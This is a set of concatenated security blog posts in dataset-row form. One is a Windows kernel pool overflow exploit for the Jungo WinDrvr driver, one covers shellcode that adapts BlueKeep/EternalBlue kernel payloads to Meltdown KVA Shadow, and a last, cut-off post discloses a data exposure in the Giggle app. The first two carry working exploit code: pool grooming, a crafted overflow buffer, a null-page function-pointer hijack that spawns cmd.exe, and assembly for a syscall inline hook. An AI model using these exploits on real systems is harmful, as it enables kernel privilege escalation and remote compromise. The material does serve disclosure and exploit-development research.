IoCo 85d1f0c0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f100 size: 60 previous size: 40 (Free) IoCo 85d1f160 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f1a0 size: 60 previous size: 40 (Free) IoCo 85d1f200 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f240 size: 60 previous size: 40 (Free) IoCo 85d1f2a0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f2e0 size: 60 previous size: 40 (Free) IoCo 85d1f340 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f380 size: 60 previous size: 40 (Free) IoCo 85d1f3e0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f420 size: 60 previous size: 40 (Free) IoCo 85d1f480 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f4c0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f520 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f560 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f5c0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f600 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f660 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f6a0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f700 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f740 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f7a0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f7e0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f840 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f880 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f8e0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f920 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f980 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f9c0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fa20 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fa60 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fac0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fb00 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fb60 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fba0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fc00 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fc40 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fca0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fce0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fd40 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fd80 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fde0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fe20 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fe80 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fec0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1ff20 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1ff60 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1ffc0 size: 40 previous size: 60 (Allocated) Even (Protected) So we can see we have seperate freed chunks. But we want to coalesce them into a single 0x460 freed chunk. To achieve this, we need to set the offset for our chunks to 0x60 (The first pointing to 0xXXXXY060). bin = [] # object sizes CreateEvent_size = 0x40 IoCompletionReserve_size = 0x60 combined_size = CreateEvent_size + IoCompletionReserve_size # after the 0x20 chunk hole, the first object will be the IoCompletionReserve object offset = IoCompletionReserve_size for i in range ( offset , offset + ( 7 * combined_size ), combined_size ): try : # chunks need to be next to each other for the coalesce to take effect bin . append ( khandlesd [ obj + i ]) bin . append ( khandlesd [ obj + i - IoCompletionReserve_size ]) except KeyError : pass # make sure it's contiguously allocated memory if len ( tuple ( bin )) == 14 : holes . append ( tuple ( bin )) # make the holes to fill for hole in holes : for handle in hole : kernel32 . CloseHandle ( handle ) Now, when we run the freeing function, we punch holes into the pool and get a freed chunk of our target size. kd> !pool 8674e000 Pool page 8674e000 region is Nonpaged pool *8674e000 size: 460 previous size: 0 (Free) *Io <-- 0x460 chunk is free Pooltag Io : general IO allocations, Binary : nt!io 8674e460 size: 60 previous size: 460 (Allocated) IoCo (Protected) 8674e4c0 size: 40 previous size: 60 (Allocated) Even (Protected) 8674e500 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674e560 size: 40 previous size: 60 (Allocated) Even (Protected) 8674e5a0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674e600 size: 40 previous size: 60 (Allocated) Even (Protected) 8674e640 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674e6a0 size: 40 previous size: 60 (Allocated) Even (Protected) 8674e6e0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674e740 size: 40 previous size: 60 (Allocated) Even (Protected) 8674e780 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674e7e0 size: 40 previous size: 60 (Allocated) Even (Protected) 8674e820 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674e880 size: 40 previous size: 60 (Allocated) Even (Protected) 8674e8c0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674e920 size: 40 previous size: 60 (Allocated) Even (Protected) 8674e960 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674e9c0 size: 40 previous size: 60 (Allocated) Even (Protected) 8674ea00 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674ea60 size: 40 previous size: 60 (Allocated) Even (Protected) 8674eaa0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674eb00 size: 40 previous size: 60 (Allocated) Even (Protected) 8674eb40 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674eba0 size: 40 previous size: 60 (Allocated) Even (Protected) 8674ebe0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674ec40 size: 40 previous size: 60 (Allocated) Even (Protected) 8674ec80 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674ece0 size: 40 previous size: 60 (Allocated) Even (Protected) 8674ed20 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674ed80 size: 40 previous size: 60 (Allocated) Even (Protected) 8674edc0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674ee20 size: 40 previous size: 60 (Allocated) Even (Protected) 8674ee60 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674eec0 size: 40 previous size: 60 (Allocated) Even (Protected) 8674ef00 size: 60 previous size: 40 (Allocated) IoCo (Protected) 8674ef60 size: 40 previous size: 60 (Allocated) Even (Protected) 8674efa0 size: 60 previous size: 40 (Allocated) IoCo (Protected) We can see that the freed chunks have been coalesced and now we have a perfect sized hole. All we need to do is allocate and overwrite. def we_can_trigger_the_pool_overflow (): """""" This triggers the pool overflow vulnerability using a buffer of size 0x460. """""" GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x3 DEVICE_NAME = "" \\\\ . \\ WinDrvr1240"" dwReturn = c_ulong () driver_handle = kernel32 . CreateFileA ( DEVICE_NAME , GENERIC_READ | GENERIC_WRITE , 0 , None , OPEN_EXISTING , 0 , None ) inputbuffer = 0x41414141 inputbuffer_size = 0x5000 outputbuffer_size = 0x5000 outputbuffer = 0x20000000 alloc_pool_overflow_buffer ( inputbuffer , inputbuffer_size ) IoStatusBlock = c_ulong () if driver_handle : dev_ioctl = ntdll . ZwDeviceIoControlFile ( driver_handle , None , None , None , byref ( IoStatusBlock ), 0x953824b7 , inputbuffer , inputbuffer_size , outputbuffer , outputbuffer_size ) return True return False Surviving the Overflow You may have noticed the null dword in the exploit at offset 0x90 within the buffer. def alloc_pool_overflow_buffer ( base , input_size ): """""" Craft our special buffer to trigger the overflow. """""" print ""(+) allocating pool overflow input buffer"" baseadd = c_int ( base ) size = c_int ( input_size ) input = "" \x41 "" * 0x18 # offset to size input += struct . pack ( ""<I"" , 0x0000008d ) # controlled size (this triggers the overflow) input += "" \x42 "" * ( 0x90 - len ( input )) # padding to survive bsod input += struct . pack ( ""<I"" , 0x00000000 ) # use a NULL dword for sub_4196CA input += "" \x43 "" * (( 0x460 - 0x8 ) - len ( input )) # fill our pool buffer This is needed to survive the overflow and avoid any further processing. The following code listing is executed directly after the copy loop. .text:004199ED loc_4199ED: ; CODE XREF: sub_41998E+41 .text:004199ED push 9 .text:004199EF pop ecx .text:004199F0 lea eax, [ebx+90h] ; controlled from the copy .text:004199F6 push eax ; void * .text:004199F7 lea esi, [edx+6Ch] ; controlled offset .text:004199FA lea eax, [edx+90h] ; controlled offset .text:00419A00 lea edi, [ebx+6Ch] ; controlled from copy .text:00419A03 rep movsd .text:00419A05 push eax ; int .text:00419A06 call sub_4196CA ; call sub_4196CA The important point is that the code will call sub_4196CA. Also note that @eax becomes our buffer +0x90 (0x004199FA). Let’s take a look at that function call. .text:004196CA sub_4196CA proc near ; CODE XREF: sub_4195A6+1E .text:004196CA ; sub_41998E+78 ... .text:004196CA .text:004196CA arg_0 = dword ptr 8 .text:004196CA arg_4 = dword ptr 0Ch .text:004196CA .text:004196CA push ebp .text:004196CB mov ebp, esp .text:004196CD push ebx .text:004196CE mov ebx, [ebp+arg_4] .text:004196D1 push edi .text:004196D2 push 3C8h ; size_t .text:004196D7 push 0 ; int .text:004196D9 push ebx ; void * .text:004196DA call memset .text:004196DF mov edi, [ebp+arg_0] ; controlled buffer .text:004196E2 xor edx, edx .text:004196E4 add esp, 0Ch .text:004196E7 mov [ebp+arg_4], edx .text:004196EA mov eax, [edi] ; make sure @eax is null .text:004196EC mov [ebx], eax ; the write here is fine .text:004196EE test eax, eax .text:004196F0 jz loc_4197CB ; take the jump The code gets a dword value from our SystemBuffer at +0x90, writes to our overflowed buffer and then tests it for null. If it’s null, we can avoid further processing in this function and return. .text:004197CB loc_4197CB: ; CODE XREF: sub_4196CA+26 .text:004197CB pop edi .text:004197CC pop ebx .text:004197CD pop ebp .text:004197CE retn 8 If we don’t do this, we will likley BSOD when attempting to access non-existant pointers from our buffer within this function (we could probably survive this anyway). Now we can return cleanly and trigger the eop without any issues. For the shellcode cleanup, our overflown buffer is stored in @esi, so we can calculate the offset to the TypeIndex and patch it up. Finally, smashing the ObjectCreateInfo with null is fine because the system will just avoid using that pointer. Crafting Our Buffer Since the loop copies 0x8 bytes on every iteration and since the starting index is 0x1c: .text:004199D3 lea ecx, [ebx+1Ch] ; index offset for the first write We can do our overflow calculation like so. Let’s say we want to overflow the buffer by 44 bytes (0x2c). We take the buffer size, subtract the header, subtract the starting index offset, add the amount of bytes we want to overflow and divide it all by 0x8 (due to the qword copy per loop iteration). That becomes (0x460 - 0x8 - 0x1c + 0x2c) / 0x8 = 0x8d So a size of 0x8d will overflow the buffer by 0x2c or 44 bytes. This smashes the pool header, quota and object header. # repair the allocated chunk header... input += struct . pack ( ""<I"" , 0x040c008c ) # _POOL_HEADER input += struct . pack ( ""<I"" , 0xef436f49 ) # _POOL_HEADER (PoolTag) input += struct . pack ( ""<I"" , 0x00000000 ) # _OBJECT_HEADER_QUOTA_INFO input += struct . pack ( ""<I"" , 0x0000005c ) # _OBJECT_HEADER_QUOTA_INFO input += struct . pack ( ""<I"" , 0x00000000 ) # _OBJECT_HEADER_QUOTA_INFO input += struct . pack ( ""<I"" , 0x00000000 ) # _OBJECT_HEADER_QUOTA_INFO input += struct . pack ( ""<I"" , 0x00000001 ) # _OBJECT_HEADER (PointerCount) input += struct . pack ( ""<I"" , 0x00000001 ) # _OBJECT_HEADER (HandleCount) input += struct . pack ( ""<I"" , 0x00000000 ) # _OBJECT_HEADER (Lock) input += struct . pack ( ""<I"" , 0x00080000 ) # _OBJECT_HEADER (TypeIndex) input += struct . pack ( ""<I"" , 0x00000000 ) # _OBJECT_HEADER (ObjectCreateInfo) We can see that we set the TypeIndex to 0x00080000 (actually it’s the lower word) to null. This means that that the function table will point to 0x0 and conveniently enough, we can map the null page. kd> dd nt!ObTypeIndexTable L2 82b7dee0 00000000 bad0b0b0 Note that the second index is 0xbad0b0b0. I get a funny feeling I can use this same technique on x64 as well :-> Triggering Code Execution in the Kernel Well, we survive execution after triggering our overflow, but in order to gain eop we need to set a pointer to 0x00000074 to leverage the OkayToCloseProcedure function pointer. kd> dt nt!_OBJECT_TYPE name 84fc8040 +0x008 Name : _UNICODE_STRING ""IoCompletionReserve"" kd> dt nt!_OBJECT_TYPE 84fc8040 . +0x000 TypeList : [ 0x84fc8040 - 0x84fc8040 ] +0x000 Flink : 0x84fc8040 _LIST_ENTRY [ 0x84fc8040 - 0x84fc8040 ] +0x004 Blink : 0x84fc8040 _LIST_ENTRY [ 0x84fc8040 - 0x84fc8040 ] +0x008 Name : ""IoCompletionReserve"" +0x000 Length : 0x26 +0x002 MaximumLength : 0x28 +0x004 Buffer : 0x88c01090 ""IoCompletionReserve"" +0x010 DefaultObject : +0x014 Index : 0x0 '' <--- TypeIndex is 0x0 +0x018 TotalNumberOfObjects : 0x61a9 +0x01c TotalNumberOfHandles : 0x61a9 +0x020 HighWaterNumberOfObjects : 0x61a9 +0x024 HighWaterNumberOfHandles : 0x61a9 +0x028 TypeInfo : <-- TypeInfo is offset 0x28 from 0x0 +0x000 Length : 0x50 +0x002 ObjectTypeFlags : 0x2 '' +0x002 CaseInsensitive : 0y0 +0x002 UnnamedObjectsOnly : 0y1 +0x002 UseDefaultObject : 0y0 +0x002 SecurityRequired : 0y0 +0x002 MaintainHandleCount : 0y0 +0x002 MaintainTypeList : 0y0 +0x002 SupportsObjectCallbacks : 0y0 +0x002 CacheAligned : 0y0 +0x004 ObjectTypeCode : 0 +0x008 InvalidAttributes : 0xb0 +0x00c GenericMapping : _GENERIC_MAPPING +0x01c ValidAccessMask : 0xf0003 +0x020 RetainAccess : 0 +0x024 PoolType : 0 ( NonPagedPool ) +0x028 DefaultPagedPoolCharge : 0 +0x02c DefaultNonPagedPoolCharge : 0x5c +0x030 DumpProcedure : (null) +0x034 OpenProcedure : (null) +0x038 CloseProcedure : (null) +0x03c DeleteProcedure : (null) +0x040 ParseProcedure : (null) +0x044 SecurityProcedure : 0x82cb02ac long nt!SeDefaultObjectMethod+0 +0x048 QueryNameProcedure : (null) +0x04c OkayToCloseProcedure : (null) <--- OkayToCloseProcedure is offset 0x4c from 0x0 +0x078 TypeLock : +0x000 Locked : 0y0 +0x000 Waiting : 0y0 +0x000 Waking : 0y0 +0x000 MultipleShared : 0y0 +0x000 Shared : 0y0000000000000000000000000000 (0) +0x000 Value : 0 +0x000 Ptr : (null) +0x07c Key : 0x6f436f49 +0x080 CallbackList : [ 0x84fc80c0 - 0x84fc80c0 ] +0x000 Flink : 0x84fc80c0 _LIST_ENTRY [ 0x84fc80c0 - 0x84fc80c0 ] +0x004 Blink : 0x84fc80c0 _LIST_ENTRY [ 0x84fc80c0 - 0x84fc80c0 ] So, 0x28 + 0x4c = 0x74, which is the location of where our pointer needs to be. But how is the OkayToCloseProcedure called? Turns out, that this is a registered aexit handler. So to trigger the execution of code, one just needs to free the corrupted IoCompletionReserve. We don’t know which handle is associated with the overflown chunk, so we just free them all. def trigger_lpe (): """""" This function frees the IoCompletionReserve objects and this triggers the registered aexit, which is our controlled pointer to OkayToCloseProcedure. """""" # free the corrupted chunk to trigger OkayToCloseProcedure for k , v in khandlesd . iteritems (): kernel32 . CloseHandle ( v ) os . system ( ""cmd.exe"" ) Obligatory, screenshot: Timeline 2017-08-22 – Verified and sent to Jungo via {sales,first,security,info}@jungo.com. 2017-08-25 – No response from Jungo and two bounced emails. 2017-08-26 – Attempted a follow up with the vendor via website chat. 2017-08-26 – No response via the website chat. 2017-09-03 – Recieved an email from a Jungo representative stating that they are “looking into it”. 2017-09-03 – Requested an timeframe for patch development and warned of possible 0day release. 2017-09-06 – No response from Jungo. 2017-09-06 – Public 0day release of advisory. Some people ask how long it takes me to develop exploits. Honestly, since the kernel is new to me, it took me a little longer than normal. For vulnerability analysis and exploitation of this bug, it took me 1.5 days (over the weekend) which is relatively slow for an older platform. Conclusion Any size chunk that is < 0x1000 can be exploited in this manner. As mentioned, this is not a new technique, but merely a variation to an already existing technique that I wouldn’t have discovered if I stuck to exploiting HEVD. Having said that, the ability to take a pre-existing vulnerable driver and develop exploitation techniques from it proves to be invaluable. Kernel pool determinimism is strong, simply because if you randomize more of the kernel, then the operating system takes a performance hit. The balance between security and performance has always been problematic and it isn’t always so clear unless you are dealing directly with the kernel. References https://github.com/hacksysteam/HackSysExtremeVulnerableDriver http://www.fuzzysecurity.com/tutorials/expDev/20.html https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf https://msdn.microsoft.com/en-us/library/windows/desktop/ms724485(v=vs.85).aspx https://www.exploit-db.com/exploits/34272 Shoutout’s to bee13oy for the help! Here, you can find the advisory and the exploit ."
ea18a248-d27d-5f9d-be65-8a6d38bdf113,07-November-2019,Fixing Remote Windows Kernel Payloads to Bypass Meltdown KVA Shadow,"Side effects of the Meltdown patch inadvertently break the syscall hooking kernel payloads used in BlueKeep and other exploits. The exploit can still be used to run Mimikatz on system shells, but it's not reliable.","Update 11/8/2019: @sleepya_ informed me that the call-site for BlueKeep shellcode is actually at PASSIVE_LEVEL. Some parts of the call gadget function acquire locks and raise IRQL, causing certain crashes I saw during early exploit development. In short, payloads can be written that don't need to deal with KVA Shadow. However, this writeup can still be useful for kernel exploits such as EternalBlue and possibly future others. Background Meltdown CPU Vulnerability KVA Shadow Mitigation KiSystemCall64Shadow Changes Existing Remote Kernel Payloads Hooking IA32_LSTAR MSR Double Fault Root Cause Analysis Hooking KiSystemCall64Shadow Heuristic Offset Detection Atomic x64 Function Hooking Cleaning Up the Hook Conclusion Background BlueKeep is a fussy exploit. In a lab environment, the Metasploit module can be a decently reliable exploit*. But out in the wild on penetration tests the results have been... lackluster. While I mostly blamed my failed experiences on the mystical reptilian forces that control everything, something inside me yearned for a more difficult explanation. After the first known BlueKeep attacks hit this past weekend, a tweet by sleepya slipped under the radar, but immediately clued me in to at least one major issue. From call stack, seems target has kva shadow patch. Original eternalblue kernel shellcode cannot be used on kva shadow patch target. So the exploit failed while running kernel shellcode — Worawit Wang (@sleepya_) November 3, 2019 Turns out my BlueKeep development labs didn't have the Meltdown patch, yet out in the wild it's probably the most common case. tl;dr: Side effects of the Meltdown patch inadvertently breaks the syscall hooking kernel payloads used in exploits such as EternalBlue and BlueKeep. Here is a horribly hacky way to get around it... but: it pops system shells so you can run Mimikatz, and after all isn't that what it's all about? Galaxy Brain tl;dr: Inline hook compatibility for both KiSystemCall64Shadow and KiSystemCall64 instead of replacing IA32_LSTAR MSR. PoC||GTFO: Experimental MSF BlueKeep + Meltdown Diff * Fine print: BlueKeep can be reliable with proper knowledge of the NPP base address, which varies radically across VM families due to hotfix memory increasing the PFN table size. There's also an outstanding issue or two with the lock in the channel structure, but I digress. Meltdown CPU Vulnerability Meltdown (CVE-2017-5754), released alongside Spectre as ""Variant 3"", is a speculative execution CPU bug announced in January 2018. As an optimization, modern processors are loading and evaluating and branching (""speculating"") way before these operations are ""actually"" to be run. This can cause effects that can be measured through side channels such as cache timing attacks. Through some clever engineering, exploitation of Meltdown can be abused to read kernel memory from a rogue userland process. KVA Shadow Windows mitigates Meltdown through the use of Kernel Virtual Address (KVA) Shadow , known as Kernel Page-Table Isolation (KPTI) on Linux, which are differing implementations of the KAISER fix in the original whitepaper. When a thread is in user-mode, its virtual memory page tables should not have any knowledge of kernel memory. In practice, a small subset of kernel code and structures must be exposed (the ""Shadow""), enough to swap to the kernel page tables during trap exceptions, syscalls, and similar. Switching between user and kernel page tables on x64 is performed relatively quickly, as it is just swapping out a pointer stored in the CR3 register. KiSystemCall64Shadow Changes The above illustrated process can be seen in the patch diff between the old and new NTOSKRNL system call routines. Here is the original KiSystemCall64 syscall routine (before Meltdown): The swapgs instruction changes to the kernel gs segment, which has a KPCR structure at offset 0. The user stack is stored at gs:0x10 (KPCR->UserRsp) and the kernel stack is loaded from gs:0x1a8 (KPCR->Prcb.RspBase). Compare to the KiSystemCall64Shadow syscall routine (after the Meltdown patch): Swap to kernel GS segment Save user stack to KPCR->Prcb.UserRspShadow Check if KPCR->Prcb.ShadowFlags first bit is set Set CR3 to KPCR->Prcb.KernelDirectoryTableBase Load kernel stack from KPCR->Prcb.RspBaseShadow The kernel chooses whether to use the Shadow version of the syscall at boot time in nt!KiInitializeBootStructures, and sets the ShadowFlags appropriately. NOTE: I have highlighted the common push 2b instructions above, as they will be important for the shellcode to find later on. Existing Remote Kernel Payloads The authoritative guide to kernel payloads is in Uninformed Volume 3 Article 4 by skape and bugcheck. There you can read all about the difficulties in tasks such as lowering IRQL from DISPATCH_LEVEL to PASSIVE_LEVEL, as well as moving code execution out from Ring 0 and into Ring 3. Hooking IA32_LSTAR MSR In both EternalBlue and BlueKeep, the exploit payloads start at the DISPATCH_LEVEL IRQL. To oversimplify, on Windows NT the processor Interrupt Request Level (IRQL) is used as a sort of locking mechanism to prioritize different types of kernel interrupts. Lowering the IRQL from DISPATCH_LEVEL to PASSIVE_LEVEL is a requirement to access paged memory and execute certain kernel routines that are required to queue a user mode APC and escape Ring 0. If IRQL is dropped artificially, deadlocks and other bugcheck unpleasantries can occur. One of the easiest, hackiest, and KPP detectable ways (yet somehow also one of the cleanest) is to simply write the IA32_LSTAR (0xc000082) MSR with an attacker-controlled function. This MSR holds the system call function pointer. User mode executes at PASSIVE_LEVEL, so we just have to change the syscall MSR to point at a secondary shellcode stage, and wait for the next system call allowing code execution at the required lower IRQL. Of course, existing payloads store and change it back to its original value when they're done with this stage. Double Fault Root Cause Analysis Hooking the syscall MSR works perfectly fine without the Meltdown patch (not counting Windows 10 VBS mitigations, etc.). However, if KVA Shadow is enabled, the target will crash with a UNEXPECTED_KERNEL_MODE_TRAP (0x7F) bugcheck with argument EXCEPTION_DOUBLE_FAULT (0x8) . We can see that at this point, user mode can see the KiSystemCall64Shadow function: However, user mode cannot see our shellcode location: The shellcode page is NOT part of the KVA Shadow code, so user mode doesn't know of its existence. The kernel gets stuck in a recursive loop of trying to handle the page fault until everything explodes! Hooking KiSystemCall64Shadow So the Galaxy Brain moment: instead of replacing the IA32_LSTAR MSR with a fake syscall, how about just dropping an inline hook into KiSystemCall64Shadow? After all, the KVASCODE section in ntoskrnl is full of beautiful, non-paged, RWX, padded, and userland-visible memory. Heuristic Offset Detection We want to accomplish two things: Install our hook in a spot after kernel pages CR3 is loaded. Provide compatibility for both KiSystemCall64Shadow and KiSystemCall64 targets. For this reason, I scan for the push 2b sequence mentioned earlier. Even though this instruction is 2-bytes long (also relevant later), I use a 4-byte heuristic pattern (0x652b6a00 little endian) as the preceding byte and following byte are stable in all versions of ntoskrnl that I analyzed. The following shellcode is the 0th stage that runs after exploitation: payload_start: ; read IA32_LSTAR mov ecx, 0xc0000082 rdmsr shl rdx, 0x20 or rax, rdx push rax ; rsi = &KiSystemCall64Shadow pop rsi ; this loop stores the offset to push 2b into ecx _find_push2b_start: xor ecx, ecx mov ebx, 0x652b6a00 _find_push2b_loop: inc ecx cmp ebx, dword [rsi + rcx - 1] jne _find_push2b_loop This heuristic is amazingly solid, and keeps the shellcode portable for both versions of the system call. There are even offset differences between the Windows 7 and Windows 10 KPCR structure that don't matter thanks to this method. The offset and syscall address are stored in a shared memory location between the two stages, for dealing with the later cleanup. Atomic x64 Function Hooking It is well known that inline hooking on x64 comes with certain annoyances. All code overwrites need to be atomic operations in order to not corrupt the executing state of other threads. There is no direct jmp imm64 instruction, and early x64 CPUs didn't even have a lock cmpxchg16b function! Fortunately, Microsoft has hotpatching built into its compiler. Among other things, this allows Microsoft to patch certain functionality or vulnerabilities of Windows without needing to reboot the system, if they like. Essentially, any function that is hotpatch-able gets padded with NOP instructions before its prologue. You can put the ultimate jmp target code gadgets in this hotpatch area, and then do a small jmp inside of the function body to the gadget. We're in x64 world so there's no classic mov edi, edi 2-byte NOP in the prologue; however in all ntoskrnl that I analyzed, there were either 0x20 or 0x40 bytes worth of NOP preceding the system call routine. So before we attempt to do anything fancy with the small jmp , we can install the BIG JMP function to our fake syscall: ; install hook call in KiSystemCall64Shadow NOP padding install_big_jmp: ; 0x905748bf = nop; push rdi; movabs rdi &fake_syscall_hook; mov dword [rsi - 0x10], 0xbf485790 lea rdi, [rel fake_syscall_hook] mov qword [rsi - 0xc], rdi ; 0x57c3 = push rdi; ret; mov word [rsi - 0x4], 0xc357 ; ... fake_syscall_hook: ; ... Now here's where I took a bit of a shortcut. Upon disassembling C++ std::atomic<std::uint16_t>, I saw that mov word ptr is an atomic operation (although sometimes the compiler will guard it with the poetic mfence ). Fortunately, small jmp is 2 bytes, and the push 2b I want to overwrite is 2 bytes. ; install tiny jmp to the NOP padding jmp install_small_jmp: ; rsi = &syscall+push2b add rsi, rcx ; eax = jmp -x ; fix -x to actual offset required mov eax, 0xfeeb shl ecx, 0x8 sub eax, ecx sub eax, 0x1000 ; push 2b => jmp -x; mov word [rsi], ax And now the hooks are installed (note some instructions are off because of x64 instruction variable length and alignment): On the next system call: the kernel stack and page tables will be loaded, our small jmp hook will goto big jmp which will goto our fake syscall handler at PASSIVE_LEVEL. Cleaning Up the Hook Multiple threads will enter into the fake syscall, so I use the existing sleepya_ locking mechanism to only queue a single APC with a lock: ; this syscall hook is called AFTER kernel stack+KVA shadow is setup fake_syscall_hook: ; save all volatile registers push rax push rbp push rcx push rdx push r8 push r9 push r10 push r11 mov rbp, STAGE_SHARED_MEM ; use lock cmpxchg for queueing APC only one at a time single_thread_gate: xor eax, eax mov dl, 1 lock cmpxchg byte [rbp + SINGLE_THREAD_LOCK], dl jnz _restore_syscall ; only 1 thread has this lock ; allow interrupts while executing ring0 to ring3 sti call r0_to_r3 cli ; all threads can clean up _restore_syscall: ; calculate offset to 0x2b using shared storage mov rdi, qword [rbp + STORAGE_SYSCALL_OFFSET] mov eax, dword [rbp + STORAGE_PUSH2B_OFFSET] add rdi, rax ; atomic change small jmp to push 2b mov word [rdi], 0x2b6a All threads restore the push 2b , as the code flow results in less bytes, no extra locking, and shouldn't matter. Finally, with push 2b restored, we just have to restore the stack and jmp back into the KiSystemCall64Shadow function. _syscall_hook_done: ; restore register values pop r11 pop r10 pop r9 pop r8 pop rdx pop rcx pop rbp pop rax ; rdi still holds push2b offset! ; but needs to be restored ; do not cause bugcheck 0xc4 arg1=0x91 mov qword [rsp-0x20], rdi pop rdi ; return to &KiSystemCall64Shadow+push2b jmp [rsp-0x28] You end up with a small chicken and egg problem at the end. You want to keep the stack pristine. My first naive solution ended in a DRIVER_VERIFIER_DETECTED_VIOLATION (0xc4) bugcheck, so I throw the return value deep in the stack out of laziness. Conclusion Here is a BlueKeep exploit with the new payload against the February 20, 2019 NT kernel, one of the more likely scenarios for a target patched for Meltdown yet still vulnerable to BlueKeep. The Meterpreter session stays alive for a few hours so I'm guessing KPP isn't fast enough just like with the IA32_LSTAR method. It's simple, it's obvious, it's hacky; but it works and so it's what you want."
e22ea390-b073-5402-aa90-b227b9c47f22,10-September-2020,Giggle; laughable security,"Giggle has been exposing user's phone numbers, private images and location to the world. the vulnerability was discovered by a female user of the app. the owner of the company has refused to disclose the vulnerability and is threatening legal action.","Preface: There is very little in this blog post that is interesting from a technical perspective. The discovered vulnerability is incredibly basic but fairly high risk. Due to the nature of the application, and the fallout from our disclosure attempt, we wanted to write up our findings. The TL;DR is that giggle has been exposing user’s phone numbers, private images and location to the world. Normally we wouldn’t post a vulnerability like this so soon after discovering it but the owner of the app refuses to listen to us and continuously claims no vulnerability exists. We tried to get in contact with her via a third party (after we had been blocked) to let her read this post before publishing it but, again, she showed no interest. (edit: We wrote but didn’t publish this article before the vulnerability was fixed. Giggle has told us it has now been fixed so we feel comfortable releasing these details.) (edit2: Sall is threating us with legal action.) (edit3: We’ve had some questions about the phrasing in the first public tweet. We standby our words. Not knowing how this would play out, we wanted to make it clear that we didn’t support the app or the founder, but wanted to report the issue. Companies can be unpredictable when reporting vulnerabilities and we wanted to avoid a situation where they would be publicly praising us or even mentioning us on their website etc.) (edit4: An apology from Giggle has been made and no futher legal action will be taken) What is Giggle? This week I set up an account on an app called giggle. You see, last month I had been diagnosed with premature menopause I and wanted to find a safe space in a woman centric environment. Somewhere I could talk openly about this experience and maybe get some support, but also find some light hearted way to socialise online. Without much investigation I found giggle, which seemed to check all the boxes. A free app, promoting safe and secure social networking. Giggle promised a refuge from misogyny and sexism where I could find support and community. There were a few red flags, such as an excessive use of pink and word “females”, but I decided to give it a go. At this point the red flags became a little more crimson. Firstly, I was asked to submit my phone number so that a verification code could be sent to my mobile. Then I was asked to allow the app to access my camera so that a selfie of me could be submitted to verify I was female. This verification, apparently, is done using AI. From previous work done on this, we know this can often be notorious for mischaracterising and therefore excluding certain racial groups, some trans women and some masculine looking women. The app assured me that my verification picture would not be stored so not to worry about what I looked like, so my gargoylesq visage was submitted (I’ll get to the later) and I was duly approved to enter the app. I went to set up my profile to see what information was publicly available about me, even if only in the app, to find there wasn’t one and I had to set up multiple profiles or ‘giggles’ to start a tinder like experience on each specific subject I was interested in (I chose menopause, body image, hiking and wine tasting), that range from socialising and hobbies to more high risk areas such as abuse and sex work. As I was curious how secure my data was, and as we are currently working on improvements to REX (and thought they’d maybe like a free license ), we decided to dig a little deeper. Viewing Account Details Using BurpSuite and a fresh install of the app, we intercepted the network traffic and found a few interesting things that we decided not to look at further as we didn’t have permission to do a full analysis. During the registration process, as mentioned, users are required to verify a phone number and selfie. We submitted a selfie that wouldn’t pass and, unsurprisingly, couldn’t gain access to giggle. Looking at the network requests revealed that although the account was in an unvalidated state, we still had a valid auth token (it turns out this is hardcoded into the application) allowing us to make requests to the API. Again, we didn’t perform a 